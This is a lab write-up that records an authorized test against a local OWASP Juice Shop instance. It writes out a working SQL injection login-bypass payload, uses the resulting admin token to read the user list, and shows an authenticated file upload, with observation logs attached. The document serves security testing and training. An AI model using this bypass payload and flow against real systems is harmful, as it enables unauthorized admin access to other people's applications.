> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_file_upload_marker_pdf

Status: verified-lab-flow / authorized local lab / Kali-side state-change evidence
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> direct SSH/SCP -> `<attacker-vm>` (`<lab-ip>`) -> Juice Shop victim `http://<lab-ip>:3000/`
Artifacts: `<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/`

## Purpose

Verify whether the lab target accepts an authenticated uploaded marker file after SQLi auth bypass creates an admin lab session.

This is a lab-only state-change flow. It proves the endpoint accepted a marker PDF with HTTP 204. It does **not** yet prove the file is retrievable or executable, and it does not claim arbitrary file write/RCE.

## Mapping

- OWASP 2021: A01 Broken Access Control, because the upload was performed with an admin session obtained through SQLi auth bypass.
- OWASP 2021: A03 Injection, as the session prerequisite came from SQLi.
- OWASP 2021: A04 Insecure Design / business-flow abuse, contextual only.
- CVE mapping: none claimed; this is app-specific lab behavior.

## Preconditions

- Authorized disposable local lab target: `http://<lab-ip>:3000/`.
- Attacker route: `<attacker-vm>`.
- Target healthy before run: HTTP 200.
- SQLi auth bypass succeeds using known lab payload.

## Trigger flow

1. Confirm unauthenticated control:

```http
GET /api/Users
```

Observed: HTTP 401.

2. Obtain admin lab token through SQLi auth bypass:

```http
POST /rest/user/login
Content-Type: application/json

{"email":"admin@juice-sh.op'--","password":"vf2"}
```

Observed:

```text
HTTP 200
token_present=true
email=admin@juice-sh.op
```

3. Use token to confirm privileged API read:

```http
GET /api/Users
Authorization: Bearer <redacted-admin-lab-token>
```

Observed:

```text
HTTP 200
user_count=22
```

4. Upload harmless marker PDF:

```http
POST /file-upload
Authorization: Bearer <redacted-admin-lab-token>
Content-Type: multipart/form-data

file=@vf2b_marker.pdf
complaint=VF2B authorized lab marker upload attempt
```

Observed:

```text
HTTP 204
bytes=0
```

Marker artifact generated locally on Kali before upload:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/state_change/vf2b_marker.pdf`

## Evidence

Primary observation file:

`<artifact-output-dir>/kali_verified_flow_wave2b_20260522T001740Z/observations.jsonl`

Relevant records:

```json
{"name":"api_users_unauth_control","status":401}
{"name":"sqli_auth_bypass_login_known_payload","status":200,"token_present":true,"email":"admin@juice-sh.op"}
{"name":"api_users_admin_read_after_sqli","status":200,"user_count":22}
{"name":"file_upload_marker_pdf_attempt","status":204,"bytes":0}
```

## Impact level

Current verified impact:

```text
Level 3/4 boundary: authenticated state-changing upload endpoint accepted a lab marker file after SQLi-derived admin session.
```

Not yet verified:

```text
- server-side storage path
- retrieval URL
- overwrite/path traversal
- executable upload
- command execution
```

## Cleanup / recovery

- No direct server shell was obtained.
- No cleanup endpoint for the uploaded complaint file was identified in this run.
- Post-health remained HTTP 200.
- If future runs need a clean state, use the existing Juice Shop/lab reset or VM snapshot restore path.

## False-positive controls

- Upload success is based on HTTP 204 from `/file-upload`, not SPA fallback HTML.
- The marker file was harmless PDF content.
- This bundle does not claim RCE or retrievable arbitrary file write.

## Real-target migration limits

Do not use this flow on real targets unless explicitly authorized and rules permit authentication bypass verification plus upload/state-changing tests. For real programs, replace marker uploads with approved non-persistent evidence or coordinate with the program/client first.
